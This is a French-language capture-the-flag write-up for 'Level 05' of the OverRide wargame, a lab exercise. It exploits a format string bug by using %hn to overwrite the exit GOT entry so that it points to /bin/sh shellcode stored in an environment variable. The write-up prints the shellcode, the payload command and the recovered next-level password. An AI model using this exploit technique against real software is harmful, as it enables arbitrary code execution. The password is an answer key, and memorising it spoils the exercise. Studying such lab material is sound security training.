# Level 05

Nous remarquons un `fgets` suivit d'un `printf` avec notre entrée en tant que string de formattage, ce qui est une faille de sécurité facile à exploiter.

Ensuite le programme fait appel à `exit` pour nous empecher d'utiliser l'adresse de retour de la fonction.

On set une variable d'environnement contenant notre shellcode.

```bash
export S=$(python -c 'print "\x90"*100+"\x31\xC0\x31\xDB\x31\xD2\x31\xC9\xB0\x0B\x53\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\xCD\x80"')
```

Nous utiliserons le flag `%hn` pour remplacer l'adresse de exit dans la Global Offset Table par celle de notre variable d'environment.

Pour cela il nous faut: 
- l'adresse d'exit dans la GOT: `0x80497e0`

```gdb
 08048370 <exit@plt>:
 8048370:       ff 25 e0 97 04 08       jmp    *0x80497e0
 8048376:       68 18 00 00 00          push   $0x18
 804837b:       e9 b0 ff ff ff          jmp    8048330 <_init+0x38>
```

- l'adresse de notre variable d'environnement : `0xffffddb9`

Nous utilisons un programme pour obtenir l'addresse de la variable:

```c
int main()
{
    printf("%p\n", getenv("S"));
}
```

- l'offset du début du buffer dans la stack pour l'utiliser avec le flag hn: `10`

```bash
level05@OverRide:~$ (python -c 'print "aaaa"+"%p."*10 ') | ./level05 
aaaa0x64.0xf7fcfac0.0xf7ec3af9.0xffffd56f.0xffffd56e.(nil).0xffffffff.0xffffd5f4.0xf7fdb000.0x61616161.
```

Nous devons ensuite découper l'adresse de notre variable en 2 parties pour l'écrire avec les hn (qui n'écrivent que 16 bits à la fois)

La partie haute est donc `0xffff` et la partie basse `0xddb9`

Notre payload sera donc:

```bash
level05@OverRide:~$ (python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1] + "%"+str(0xddb9-8)+"x%10$hn%"+str(0xffff - 0xddb9)+"x%11$hn"'; echo "cat /home/users/level06/.pass") | ./level05
```

Résultat:
```
[...]
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```